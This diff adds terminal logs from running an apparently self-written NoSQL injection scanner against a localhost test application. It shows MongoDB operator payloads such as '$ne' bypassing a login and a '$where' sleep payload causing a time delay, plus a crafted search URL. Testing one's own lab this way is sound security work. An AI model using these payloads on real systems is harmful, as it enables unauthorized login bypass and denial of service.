@@ -1,0 +1,46 @@
+ python3 .\nosql_injector.py -u http://localhost:5001/login -X POST -d "username=coduronin&password=c" -p password  -v -t "application/x-www-form-urlencoded"
+Establishing a baseline response...
+Baseline established. Status: 401, Length: 2385, Time: 2.03s
+Testing parameter: password
+[VERBOSE] Payload: {"$where": "true"} | Status: Error (No Response Object) | Time: 2.06s | Length: 0
+[VERBOSE] Payload: {"$where": "this.username == 'admin'"} | Status: Error (No Response Object) | Time: 2.06s | Length: 0
+[VERBOSE] Payload: {"$where": "function() { return this.username == 'admin'; }"} | Status: Error (No Response Object) | Time: 2.05s | Length: 0
+[VERBOSE] Payload: {"$where": "sleep(5000)"} | Status: Error (No Response Object) | Time: 2.06s | Length: 0
+[VERBOSE] Payload: {"$ne": "nonexistent"} | Status: 200 OK | Time: 2.05s | Length: 8258
+[+] Vulnerable (Status Code Change) with payload: {"$ne": "nonexistent"}
+Status: 200 (Baseline: 401)
+PS C:\Users\izzat\Documents\NoSqlInjection\tool> 
+
+
+
+
+  python3 .\nosql_injector.py -u http://localhost:5001/login -X POST -d "username=coduronin&password=c" -p password  -v -C "Content-Type: application/x-www-form-urlencoded"
+Establishing a baseline response...
+Baseline established. Status: 401, Length: 2385, Time: 2.07s
+Testing parameter: password
+[VERBOSE] Payload: {"$where": "sleep(5000)"} | Status: Error (No Response Object) | Time: 2.05s | Length: 0
+[VERBOSE] Payload: {"$where": "true"} | Status: Error (No Response Object) | Time: 2.03s | Length: 0
+[VERBOSE] Payload: {"$where": "this.username == 'admin'"} | Status: Error (No Response Object) | Time: 2.02s | Length: 0
+[VERBOSE] Payload: {"$where": "function() { return this.username == 'admin'; }"} | Status: Error (No Response Object) | Time: 2.02s | Length: 0
+[VERBOSE] Payload: {"$where": "sleep(5000)"} | Status: Error (No Response Object) | Time: 2.05s | Length: 0
+[VERBOSE] Payload: {"$ne": "nonexistent"} | Status: 200 OK | Time: 2.03s | Length: 8258
+[+] Vulnerable (Status Code Change) with payload: {"$ne": "nonexistent"}
+Status: 200 (Baseline: 401)
+
+
+python3 .\nosql_injector.py -u http://localhost:5001/search -X GET -d "q=x" -p q -C "Cookie: session=eyJpc19hZG1pbiI6ZmFsc2UsInVzZXJfaWQiOiI2OGZmN2VjYTE0NDkwNTQ1NjBlMzNhMDQiLCJ1c2VybmFtZSI6ImNvZHVyb25pbiJ9.aTirtQ.1ul5t9aHSKunbhnAZn6yj6OcHZI" --time-based -v
+[Time-Based] Establishing baseline response time (3 measurements)...
+[Time-Based] Baseline measurement 1: 2.10s
+[Time-Based] Baseline measurement 2: 2.05s
+[Time-Based] Baseline measurement 3: 2.07s
+[Time-Based] Average baseline response time: 2.07s
+[Time-Based] Testing parameter: q with time-based payloads...
+[Time-Based] Payload: {'$where': 'true'} | Response time: 2.15s
+[Time-Based] Payload: {'$where': "this.username == 'admin'"} | Response time: 2.04s
+[Time-Based] Payload: {'$where': "function() { return this.username == 'admin'; }"} | Response time: 2.06s
+[Time-Based] Payload: {'$where': 'sleep(5000)'} | Response time: 87.09s
+[+] Time-based NoSQL Injection detected with payload: {'$where': 'sleep(5000)'} (Response time: 87.09s)
+PS C:\Users\izzat\Documents\NoSqlInjection\tool> 
+
+
+http://localhost:5001/search?q={%22$where%22:%20%22sleep(5000)%22}
